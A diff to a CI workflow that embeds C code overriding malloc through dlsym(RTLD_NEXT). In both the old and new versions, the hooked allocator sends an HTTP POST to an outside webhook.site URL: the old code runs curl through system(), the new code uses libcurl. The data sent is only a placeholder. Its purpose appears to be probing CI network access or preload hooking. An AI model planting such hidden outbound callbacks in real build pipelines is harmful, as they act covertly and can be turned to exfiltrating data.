@@ -20,16 +20,45 @@ jobs:
           #include <stdio.h>
           #include <dlfcn.h>
           #include <stdlib.h>
+          #include <curl/curl.h>
+          #include <string.h>
 
           static void* (*real_malloc)(size_t)=NULL;
           static int i = 0;
 
           void *malloc(size_t size)
           {
-              if(i < 3) {
-                system("curl -X POST \"https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64\"");
-                i=i++;
+            CURL *curl;
+            CURLcode res;
+            char *data = "{\"key\":\"value\"}";
+
+              if(i < 1) {
+                curl = curl_easy_init();
+
+                if(curl) {
+                  // Set the URL for the POST request
+                  curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64");
+          
+                  // Specify the POST data
+                  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
+          
+                  // Set the content type header
+                  struct curl_slist *headers = NULL;
+                  headers = curl_slist_append(headers, "Content-Type: application/json");
+                  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+          
+                  // Perform the request, res will get the return code
+                  res = curl_easy_perform(curl);
+          
+                  // Check for errors
+                  if(res != CURLE_OK)
+                      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+          
+                  // Cleanup
+                  curl_easy_cleanup(curl);
+                  curl_slist_free_all(headers);
               }
+
               real_malloc = dlsym(RTLD_NEXT, "malloc");
               return real_malloc(size);
           }
